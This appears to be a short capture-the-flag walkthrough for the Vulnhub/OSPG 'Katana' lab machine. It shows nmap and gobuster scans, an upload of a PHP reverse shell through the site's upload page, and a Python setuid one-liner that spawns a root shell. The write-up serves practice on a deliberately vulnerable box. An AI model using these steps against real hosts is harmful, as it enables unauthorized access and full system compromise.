# Katana

Author: Vulnhub, OSPG
Difficulty: 3
Tags: cse bookstore, python
Type: Linux

# Enumeration

- portscan

```bash
kali@kali:~$ nmap -A -T4 -sC -sV -p21,22,80,7080,8088,8715 192.168.53.83 -oN scan
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 09:30 EDT
Nmap scan report for katana.ospg (192.168.53.83)
Host is up (0.00040s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Katana X
7080/tcp open  ssl/empowerid LiteSpeed
|_http-server-header: LiteSpeed
|_http-title: Did not follow redirect to https://katana.ospg:7080/
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-11T13:57:36
|_Not valid after:  2022-05-11T13:57:36
|_ssl-date: 2021-09-26T13:30:20+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
8088/tcp open  http          LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Katana X
8715/tcp open  http          nginx 1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.24 seconds
```

- gobuster dir scan

```sql
kali@kali:~$ gobuster dir -u http://192.168.53.83:8088 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,html
===============================================================                                                                                                                                                                          
Gobuster v3.0.1                                                                                                                                                                                                                          
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                                                                                                          
===============================================================                                                                                                                                                                          
[+] Url:            http://192.168.53.83:8088                                                                                                                                                                                            
[+] Threads:        40                                                                                                                                                                                                                   
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                                                                         
[+] Status codes:   200,204,301,302,307,401,403                                                                                                                                                                                          
[+] User Agent:     gobuster/3.0.1                                                                                                                                                                                                       
[+] Extensions:     php,txt,html                                                                                                                                                                                                         
[+] Timeout:        10s                                                                                                                                                                                                                  
===============================================================                                                                                                                                                                          
2021/09/26 09:38:55 Starting gobuster                                                                                                                                                                                                    
===============================================================                                                                                                                                                                          
/img (Status: 301)
/index.html (Status: 200)
/cgi-bin (Status: 301)
/docs (Status: 301)
/upload.php (Status: 200)
/upload.html (Status: 200)
/css (Status: 301)
/protected (Status: 301)
/blocked (Status: 301)
/phpinfo.php (Status: 200)
```

# Initial Access

upload a reverse shell on [http://ip:8088/upload.html](http://ip:8088/upload.html) and access it on the url provided 

http://ip:8088/katana_php-reverse-shell.php

# Privilege Escalation

```sql
# as python2.7 was vulnerable, we could get root shell using this method
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

# Notes

-